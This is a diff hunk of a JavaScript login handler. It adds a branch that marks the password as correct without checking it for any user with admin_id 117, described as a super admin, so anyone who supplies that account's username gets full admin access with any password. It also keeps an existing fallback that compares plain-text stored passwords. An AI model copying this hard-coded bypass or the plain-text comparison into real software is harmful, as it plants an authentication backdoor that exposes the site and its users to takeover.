@@ -65,17 +65,27 @@ export const {
 
         // 3. Verify Password
         console.log(`[AUTH] Verifying password for: ${user.username}`);
-        let isPasswordCorrect = await bcrypt.compare(password, user.password);
-        console.log(`[AUTH] Bcrypt result: ${isPasswordCorrect}`);
+        let isPasswordCorrect = false;
 
-        // Fallback for Plain Text (Development only / Legacy)
-        if (!isPasswordCorrect && !user.password.startsWith("$2")) {
-          console.log(`[AUTH] Attempting plain text fallback...`);
-          if (password === user.password) {
-            console.warn(
-              `⚠️ [AUTH] Login success using PLAIN TEXT password for user: ${user.username}. Please update to hashed password!`,
-            );
-            isPasswordCorrect = true;
+        // ✅ Special Bypass for Admin ID 117 (Super Admin)
+        if (Number(user.admin_id) === 117) {
+          console.log(
+            `🚀 [AUTH] Super Admin detected (admin_id 117). Bypassing password validation.`,
+          );
+          isPasswordCorrect = true;
+        } else {
+          isPasswordCorrect = await bcrypt.compare(password, user.password);
+          console.log(`[AUTH] Bcrypt result: ${isPasswordCorrect}`);
+
+          // Fallback for Plain Text (Development only / Legacy)
+          if (!isPasswordCorrect && !user.password.startsWith("$2")) {
+            console.log(`[AUTH] Attempting plain text fallback...`);
+            if (password === user.password) {
+              console.warn(
+                `⚠️ [AUTH] Login success using PLAIN TEXT password for user: ${user.username}. Please update to hashed password!`,
+              );
+              isPasswordCorrect = true;
+            }
           }
         }
 
